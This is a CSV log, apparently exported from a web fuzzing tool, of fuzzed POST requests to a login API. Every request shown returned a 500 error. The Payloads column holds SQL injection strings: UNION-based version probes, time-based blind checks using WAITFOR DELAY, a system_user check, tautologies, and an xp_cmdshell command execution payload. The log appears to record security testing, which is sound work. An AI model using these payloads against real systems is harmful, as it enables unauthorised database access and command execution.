Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
247,Fuzzed,Sat Jan 11 17:02:37 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,410,633,109,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --, ' and 1=0) union all]"
249,Fuzzed,Sat Jan 11 17:02:37 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,633,114,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --, x' and userid is NULL; --]"
248,Fuzzed,Sat Jan 11 17:02:37 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,412,633,100,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --, ? or 1=1 --]"
246,Fuzzed,Sat Jan 11 17:02:37 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,536,632,90,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --, ?]"
251,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,108,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --, anything' or 'x'='x]"
252,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,106,633,132,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --, x' and 1=(select count(*) from tabname); --]"
253,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,633,121,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --, x' and members.email is NULL; --]"
255,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,633,102,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --, 23 or 1=1; --]"
254,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,422,633,116,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --, x' or full_name like '%bob%]"
256,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,433,633,138,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
258,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,108,632,98,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, a' ]"
257,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,421,632,96,544,14,,Reflected,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, a]"
260,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,108,633,108,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, a' or 1=1; --]"
261,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,108,632,96,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, @]"
238,Fuzzed,Sat Jan 11 17:02:36 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,1855,633,110,544,14,,,"[' union (select NULL, NULL, NULL,  (select @@version)) --, x' or full_name like '%bob%]"
262,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,107,632,96,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, ?]"
263,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,108,633,115,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, ' and 1=0) union all]"
264,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,633,106,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, ? or 1=1 --]"
266,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,119,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, x' and email is NULL; --]"
267,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,633,114,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, anything' or 'x'='x]"
269,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,124,633,127,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, x' and members.email is NULL; --]"
268,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,419,633,138,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, x' and 1=(select count(*) from tabname); --]"
265,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,722,633,120,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, x' and userid is NULL; --]"
259,Fuzzed,Sat Jan 11 17:02:38 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,1087,633,100,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, a' --]"
272,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,109,633,144,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
273,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,70,632,28,544,14,,Reflected,"[a, a]"
274,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,68,632,30,544,14,,Reflected,"[a, a' ]"
271,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,381,633,108,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, 23 or 1=1; --]"
275,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,90,632,32,544,14,,Reflected,"[a, a' --]"
276,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,632,40,544,14,,Reflected,"[a, a' or 1=1; --]"
277,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,91,632,28,544,14,,Reflected,"[a, @]"
270,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,743,633,122,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --, x' or full_name like '%bob%]"
278,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,109,632,28,544,14,,Reflected,"[a, ?]"
279,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,107,632,47,544,14,,Reflected,"[a, ' and 1=0) union all]"
280,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,38,544,14,,Reflected,"[a, ? or 1=1 --]"
281,Fuzzed,Sat Jan 11 17:02:39 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,632,52,544,14,,Reflected,"[a, x' and userid is NULL; --]"
282,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,632,51,544,14,,Reflected,"[a, x' and email is NULL; --]"
283,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,632,46,544,14,,Reflected,"[a, anything' or 'x'='x]"
285,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,124,632,59,544,14,,Reflected,"[a, x' and members.email is NULL; --]"
287,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,632,40,544,14,,Reflected,"[a, 23 or 1=1; --]"
286,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,632,54,544,14,,Reflected,"[a, x' or full_name like '%bob%]"
250,Fuzzed,Sat Jan 11 17:02:37 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,2286,633,113,544,14,,,"[' union (select NULL, NULL, NULL, NULL,  (select @@version)) --, x' and email is NULL; --]"
288,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,126,632,76,544,14,,Reflected,"[a, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
289,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,633,102,544,14,,Reflected,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, a]"
291,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,90,633,106,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, a' --]"
290,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,633,104,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, a' ]"
292,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,633,114,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, a' or 1=1; --]"
294,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,633,102,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, ?]"
284,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,415,632,70,544,14,,Reflected,"[a, x' and 1=(select count(*) from tabname); --]"
293,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,633,102,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, @]"
295,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,633,121,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, ' and 1=0) union all]"
297,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,81,633,126,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, x' and userid is NULL; --]"
296,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,633,112,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, ? or 1=1 --]"
298,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,633,125,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, x' and email is NULL; --]"
299,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,633,120,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, anything' or 'x'='x]"
300,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,118,633,144,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, x' and 1=(select count(*) from tabname); --]"
302,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,633,128,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, x' or full_name like '%bob%]"
303,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,114,633,114,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, 23 or 1=1; --]"
304,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,150,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
305,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,633,102,544,14,,Reflected,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, a]"
307,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,633,106,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, a' --]"
306,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,633,104,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, a' ]"
308,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,114,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, a' or 1=1; --]"
309,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,633,102,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, @]"
301,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,372,633,133,544,14,,,"['; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --, x' and members.email is NULL; --]"
311,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,633,121,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, ' and 1=0) union all]"
313,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,116,633,126,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, x' and userid is NULL; --]"
314,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,125,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, x' and email is NULL; --]"
315,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,126,633,120,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, anything' or 'x'='x]"
317,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,633,133,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, x' and members.email is NULL; --]"
316,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,115,633,144,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, x' and 1=(select count(*) from tabname); --]"
319,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,80,633,114,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, 23 or 1=1; --]"
318,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,124,633,128,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, x' or full_name like '%bob%]"
320,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,633,150,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
321,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,633,102,544,14,,Reflected,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, a]"
312,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,413,633,112,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, ? or 1=1 --]"
322,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,126,633,104,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, a' ]"
324,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,85,633,114,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, a' or 1=1; --]"
323,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,633,106,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, a' --]"
327,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,121,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, ' and 1=0) union all]"
326,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,123,633,102,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, ?]"
328,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,117,633,112,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, ? or 1=1 --]"
329,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,126,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, x' and userid is NULL; --]"
310,Fuzzed,Sat Jan 11 17:02:40 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,721,633,102,544,14,,,"['; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --, ?]"
330,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,127,633,125,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, x' and email is NULL; --]"
331,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,124,633,120,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, anything' or 'x'='x]"
332,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,88,633,144,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, x' and 1=(select count(*) from tabname); --]"
333,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,633,133,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, x' and members.email is NULL; --]"
336,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,88,633,150,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
325,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,420,633,102,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, @]"
334,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,119,633,128,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, x' or full_name like '%bob%]"
335,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,633,114,544,14,,,"['; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --, 23 or 1=1; --]"
338,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,633,104,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, a' ]"
337,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,113,633,102,544,14,,Reflected,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, a]"
339,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,106,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, a' --]"
340,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,120,633,114,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, a' or 1=1; --]"
342,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,633,102,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, ?]"
341,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,125,633,102,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, @]"
343,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,121,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, ' and 1=0) union all]"
239,Fuzzed,Sat Jan 11 17:02:37 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,4833,632,96,544,14,,,"[' union (select NULL, NULL, NULL,  (select @@version)) --, 23 or 1=1; --]"
167,Fuzzed,Sat Jan 11 17:02:32 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,9131,632,57,544,14,,,"[' or 1=1 --, ' and 1=0) union all]"
344,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,633,112,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, ? or 1=1 --]"
346,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,77,633,125,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, x' and email is NULL; --]"
347,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,121,633,120,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, anything' or 'x'='x]"
349,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,633,133,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, x' and members.email is NULL; --]"
352,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,79,633,150,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, '; exec master..xp_cmdshell 'ping 172.10.1.255'--]"
348,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,111,633,144,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, x' and 1=(select count(*) from tabname); --]"
351,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,114,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, 23 or 1=1; --]"
354,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,632,91,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, a' ]"
355,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,78,632,93,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, a' --]"
353,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,122,632,89,544,14,,Reflected,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, a]"
358,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,75,632,89,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, ?]"
357,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,110,632,89,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, @]"
362,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,84,633,112,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, x' and email is NULL; --]"
360,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,131,632,99,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, ? or 1=1 --]"
361,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,112,633,113,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, x' and userid is NULL; --]"
345,Fuzzed,Sat Jan 11 17:02:41 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,425,633,126,544,14,,,"['; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --, x' and userid is NULL; --]"
363,Fuzzed,Sat Jan 11 17:02:42 SGT 2025,POST,https://api.pupt-flss.com/api/login,500,Internal Server Error,81,633,107,544,14,,,"['; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --, anything' or 'x'='x]"
